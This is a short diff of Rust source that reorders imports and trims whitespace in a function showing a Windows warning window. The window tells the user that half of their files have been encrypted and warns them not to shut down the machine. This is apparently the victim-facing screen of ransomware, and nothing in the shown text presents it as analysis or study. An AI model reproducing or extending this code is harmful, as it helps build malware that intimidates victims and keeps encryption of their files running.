@@ -1,8 +1,8 @@
-use native_windows_gui as nwg;
 use native_windows_derive::NwgUi;
+use native_windows_gui as nwg;
 use nwg::NativeUi;
-use std::rc::Rc;
 use std::cell::RefCell;
+use std::rc::Rc;
 use std::thread;
 
 #[derive(Default, NwgUi)]
@@ -27,12 +27,12 @@ impl WarningWindow {
 pub fn show_warning_window() {
     thread::spawn(|| {
         nwg::init().expect("Failed to init Native Windows GUI");
-        
+
         let app = WarningWindow::build_ui(Default::default()).expect("Failed to build UI");
-        
+
         app.warning_text.set_text("DO NOT TURN OFF YOUR MACHINE! \r\n\
     Half of your files have been encrypted and you won't be able to get the originals back if your machine shuts down.");
-        
+
         nwg::dispatch_thread_events();
     });
 }
